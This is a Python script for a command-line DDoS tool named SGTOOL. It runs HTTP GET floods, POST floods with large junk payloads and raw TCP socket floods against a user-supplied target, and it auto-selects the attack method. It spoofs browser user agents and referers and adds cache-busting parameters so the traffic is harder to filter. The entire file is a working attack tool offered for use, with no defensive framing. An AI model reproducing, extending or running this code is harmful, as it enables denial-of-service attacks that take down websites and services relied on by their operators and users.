#!/usr/bin/env python3

import os
import sys
import time
import socket
import random
import argparse
import asyncio
import aiohttp
import requests
import threading
import urllib.parse
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor

# Initialize colorama
init(autoreset=True)

# ASCII Art Banner
def print_banner():
    banner = f"""
    {Fore.CYAN}███████╗ ██████╗ {Fore.RED}████████╗ ██████╗  ██████╗ ██╗     
    {Fore.CYAN}██╔════╝██╔════╝ {Fore.RED}╚══██╔══╝██╔═══██╗██╔═══██╗██║     
    {Fore.CYAN}███████╗██║  ███╗{Fore.RED}   ██║   ██║   ██║██║   ██║██║     
    {Fore.CYAN}╚════██║██║   ██║{Fore.RED}   ██║   ██║   ██║██║   ██║██║     
    {Fore.CYAN}███████║╚██████╔╝{Fore.RED}   ██║   ╚██████╔╝╚██████╔╝███████╗
    {Fore.CYAN}╚══════╝ ╚═════╝ {Fore.RED}   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
    """
    print(banner)
    print(f"    {Fore.YELLOW}⚡ Next-Gen DDoS Attack Tool ⚡\n")

# Statistics tracking
class Stats:
    def __init__(self):
        self.sent_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
    
    def update(self, success):
        with self.lock:
            self.sent_requests += 1
            if success:
                self.successful_requests += 1
            else:
                self.failed_requests += 1
    
    def get_elapsed(self):
        return time.time() - self.start_time
    
    def get_rps(self):
        elapsed = self.get_elapsed()
        if elapsed == 0:
            return 0
        return self.sent_requests / elapsed
    
    def get_success_rate(self):
        if self.sent_requests == 0:
            return 0
        return (self.successful_requests / self.sent_requests) * 100

# Connection methods
class ConnectionMethods:
    @staticmethod
    async def http_flood(session, url, headers, stats, payload=None):
        try:
            async with session.get(url, headers=headers, timeout=5) as response:
                await response.text()
                stats.update(response.status < 400)
                return response.status < 400
        except Exception:
            stats.update(False)
            return False

    @staticmethod
    async def post_flood(session, url, headers, stats, payload=None):
        try:
            if not payload:
                payload = {"data": "" * random.randint(500, 1000)}
            async with session.post(url, headers=headers, data=payload, timeout=5) as response:
                await response.text()
                stats.update(response.status < 400)
                return response.status < 400
        except Exception:
            stats.update(False)
            return False
    
    @staticmethod
    async def socket_flood(target, port, stats):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            # Generate random bytes payload
            s.send(os.urandom(random.randint(1024, 65535)))
            s.close()
            stats.update(True)
            return True
        except Exception:
            stats.update(False)
            return False

# Layer 7 attacks
class Layer7:
    def __init__(self, target, threads, duration):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.stats = Stats()
        self.running = False
        self.stop_event = asyncio.Event()

        # Parse URL
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'http://' + self.target
        
        parsed = urllib.parse.urlparse(self.target)
        self.host = parsed.netloc
        self.path = parsed.path if parsed.path else '/'
        self.ssl = parsed.scheme == 'https'
        self.port = parsed.port if parsed.port else (443 if self.ssl else 80)

    async def run_http_flood(self):
        print(f"\n{Fore.GREEN}[+] Starting HTTP FLOOD attack on {self.target}")
        print(f"{Fore.YELLOW}[!] Duration: {self.duration} seconds")
        print(f"{Fore.YELLOW}[!] Threads: {self.threads}\n")

        conn = aiohttp.TCPConnector(limit=None, ssl=None)
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
            self.running = True
            self.stats.start_time = time.time()
            tasks = []

            # Generate random user agents
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
            ]

            end_time = time.time() + self.duration

            # Random referers list
            referers = [
                "https://www.google.com/",
                "https://www.bing.com/",
                "https://www.facebook.com/",
                "https://www.twitter.com/",
                "https://www.youtube.com/",
                "https://www.instagram.com/"
            ]

            while time.time() < end_time and not self.stop_event.is_set():
                headers = {
                    "Host": self.host,
                    "User-Agent": random.choice(user_agents),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Cache-Control": "max-age=0",
                    "Referer": random.choice(referers),
                    "Pragma": "no-cache"
                }

                params = {
                    "_": str(int(time.time() * 1000))
                }

                query_string = urllib.parse.urlencode(params)
                url = f"{self.target}?{query_string}"

                for _ in range(self.threads):
                    tasks.append(asyncio.create_task(
                        ConnectionMethods.http_flood(session, url, headers, self.stats)
                    ))
                
                if len(tasks) >= 1000:  # Process in batches of 1000 to avoid memory issues
                    await asyncio.gather(*tasks)
                    tasks = []
                
                # Status update
                self._print_status("HTTP FLOOD")
                
                # Small delay to prevent overwhelming the event loop
                await asyncio.sleep(0.1)
            
            # Process any remaining tasks
            if tasks:
                await asyncio.gather(*tasks)
            
            self.running = False
            self._print_final_stats("HTTP FLOOD")

    async def run_post_flood(self):
        print(f"\n{Fore.GREEN}[+] Starting POST FLOOD attack on {self.target}")
        print(f"{Fore.YELLOW}[!] Duration: {self.duration} seconds")
        print(f"{Fore.YELLOW}[!] Threads: {self.threads}\n")

        conn = aiohttp.TCPConnector(limit=None, ssl=None)
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
            self.running = True
            self.stats.start_time = time.time()
            tasks = []

            # User agents and referers (same as HTTP flood)
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            ]
            
            referers = [
                "https://www.google.com/",
                "https://www.bing.com/",
                "https://www.facebook.com/",
                "https://www.twitter.com/",
            ]

            end_time = time.time() + self.duration

            # Create random large payloads
            payloads = [
                {"data": "A" * random.randint(1000, 2000)},
                {"content": "B" * random.randint(1000, 2000)},
                {"query": "C" * random.randint(1000, 2000)},
                {"search": "D" * random.randint(1000, 2000)},
                {"file": "E" * random.randint(1000, 2000)},
            ]

            while time.time() < end_time and not self.stop_event.is_set():
                headers = {
                    "Host": self.host,
                    "User-Agent": random.choice(user_agents),
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": self.target,
                    "Connection": "keep-alive",
                    "Referer": random.choice(referers),
                }

                payload = random.choice(payloads)

                for _ in range(self.threads):
                    tasks.append(asyncio.create_task(
                        ConnectionMethods.post_flood(session, self.target, headers, self.stats, payload)
                    ))
                
                if len(tasks) >= 1000:  # Process in batches
                    await asyncio.gather(*tasks)
                    tasks = []
                
                # Status update
                self._print_status("POST FLOOD")
                
                # Small delay
                await asyncio.sleep(0.1)
            
            # Process any remaining tasks
            if tasks:
                await asyncio.gather(*tasks)
            
            self.running = False
            self._print_final_stats("POST FLOOD")

    async def run_socket_flood(self):
        print(f"\n{Fore.GREEN}[+] Starting SOCKET FLOOD attack on {self.host}:{self.port}")
        print(f"{Fore.YELLOW}[!] Duration: {self.duration} seconds")
        print(f"{Fore.YELLOW}[!] Threads: {self.threads}\n")

        self.running = True
        self.stats.start_time = time.time()
        end_time = time.time() + self.duration

        loop = asyncio.get_event_loop()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            while time.time() < end_time and not self.stop_event.is_set():
                futures = []
                
                for _ in range(self.threads):
                    futures.append(
                        loop.run_in_executor(
                            executor, 
                            self._run_socket_worker
                        )
                    )
                
                await asyncio.gather(*futures)
                self._print_status("SOCKET FLOOD")
                await asyncio.sleep(0.1)
        
        self.running = False
        self._print_final_stats("SOCKET FLOOD")

    def _run_socket_worker(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.host, self.port))
            # Send random data to consume server resources
            # Generate random bytes payload
            s.send(os.urandom(random.randint(10240, 65535)))
            s.close()
            self.stats.update(True)
        except:
            self.stats.update(False)

    def _print_status(self, method):
        elapsed = self.stats.get_elapsed()
        if elapsed % 2 < 0.1:  # Update every ~2 seconds
            success_rate = self.stats.get_success_rate()
            color = Fore.GREEN if success_rate > 90 else (Fore.YELLOW if success_rate > 70 else Fore.RED)
            print(f"\r{Fore.CYAN}[*] {method} | Requests: {self.stats.sent_requests} | "
                  f"RPS: {self.stats.get_rps():.0f} | Success: {color}{success_rate:.2f}%{Fore.RESET} | "
                  f"Elapsed: {elapsed:.0f}s", end="")

    def _print_final_stats(self, method):
        elapsed = self.stats.get_elapsed()
        print(f"\n\n{Fore.GREEN}[+] Attack Completed!")
        print(f"\n{Fore.CYAN}Attack Results:")
        print(f"{Fore.CYAN}Method: {method}")
        print(f"{Fore.CYAN}Target: {self.target}")
        print(f"{Fore.CYAN}Duration: {elapsed:.2f} seconds")
        print(f"{Fore.CYAN}Total Requests: {self.stats.sent_requests}")
        success_rate = self.stats.get_success_rate()
        color = Fore.GREEN if success_rate > 90 else (Fore.YELLOW if success_rate > 70 else Fore.RED)
        print(f"{Fore.CYAN}Successful Requests: {self.stats.successful_requests} ({color}{success_rate:.2f}%{Fore.RESET})")
        print(f"{Fore.CYAN}Failed Requests: {self.stats.failed_requests}")
        print(f"{Fore.CYAN}Requests per Second: {self.stats.get_rps():.2f}")

# Main function
async def main():
    # Argument parser
    parser = argparse.ArgumentParser(
        description="SGTOOL - Advanced DDoS Attack Tool",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument(
        "target",
        nargs="?",
        type=str,
        help="Target URL or IP address (e.g., https://example.com or 1.1.1.1)"
    )
    
    parser.add_argument(
        "-m", "--method",
        type=str,
        choices=["HTTP", "POST", "SOCKET", "AUTO"],
        default="AUTO",
        help="Attack method (default: AUTO)"
    )
    
    parser.add_argument(
        "-t", "--threads",
        type=int,
        default=100,
        help="Number of threads (default: 100)"
    )
    
    parser.add_argument(
        "-d", "--duration",
        type=int,
        default=60,
        help="Attack duration in seconds (default: 60)"
    )
    
    parser.add_argument(
        "--help-methods",
        action="store_true",
        help="Show information about attack methods"
    )

    # Parse arguments
    if len(sys.argv) == 1:
        parser.print_help()
        return
    
    args = parser.parse_args()

    # Print banner
    print_banner()

    # Show methods info if requested
    if args.help_methods:
        print(f"\n{Fore.CYAN}Available Attack Methods:")
        print(f"{Fore.YELLOW}HTTP   - {Fore.GREEN}HTTP Flood attack using GET requests. Effective against web servers.")
        print(f"{Fore.YELLOW}POST   - {Fore.GREEN}HTTP Flood attack using POST requests with large payloads. More resource-intensive.")
        print(f"{Fore.YELLOW}SOCKET - {Fore.GREEN}Raw socket flood attack. Effective against services with TCP ports open.")
        print(f"{Fore.YELLOW}AUTO   - {Fore.GREEN}Automatically selects the best attack method based on the target.")
        return

    # Check if target is provided
    if not args.target:
        print(f"\n{Fore.RED}[!] Error: Target is required.")
        parser.print_help()
        return

    # Validate arguments
    if args.threads < 1:
        print(f"\n{Fore.RED}[!] Error: Threads must be at least 1.")
        return
    
    if args.duration < 1:
        print(f"\n{Fore.RED}[!] Error: Duration must be at least 1 second.")
        return

    # Auto-detect method if AUTO is selected
    if args.method == "AUTO":
        print(f"\n{Fore.YELLOW}[*] Auto-detecting best attack method...")
        
        target = args.target
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        parsed = urllib.parse.urlparse(target)
        host = parsed.netloc
        port = parsed.port if parsed.port else (443 if parsed.scheme == 'https' else 80)
        
        try:
            # Try a simple request to see if the server responds
            response = requests.get(target, timeout=5)
            if response.status_code < 400:
                print(f"{Fore.GREEN}[+] Target is a web server. Using HTTP POST attack.")
                args.method = "POST"
            else:
                print(f"{Fore.GREEN}[+] Target returned {response.status_code}. Using HTTP attack.")
                args.method = "HTTP"
        except requests.exceptions.RequestException:
            # If web request fails, try socket connection
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, port))
                s.close()
                print(f"{Fore.GREEN}[+] Target has open port {port}. Using SOCKET attack.")
                args.method = "SOCKET"
            except:
                print(f"{Fore.YELLOW}[!] Could not connect to target. Defaulting to HTTP attack.")
                args.method = "HTTP"

    # Create attack object
    attacker = Layer7(args.target, args.threads, args.duration)

    # Start attack based on method
    try:
        if args.method == "HTTP":
            await attacker.run_http_flood()
        elif args.method == "POST":
            await attacker.run_post_flood()
        elif args.method == "SOCKET":
            await attacker.run_socket_flood()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Attack interrupted by user")
        attacker.stop_event.set()
        print(f"\n{Fore.GREEN}[+] Attack stopped.")
        # Print final stats
        if attacker.running:
            attacker._print_final_stats(args.method)

# Entry point
if __name__ == "__main__":
    # Check if running with proper permissions for socket attacks
    try:
        if os.geteuid() == 0:
            print(f"{Fore.GREEN}[+] Running with root privileges. All attack methods available.")
    except AttributeError:
        # Windows or systems without geteuid
        pass
    
    # Run main async function
    asyncio.run(main())
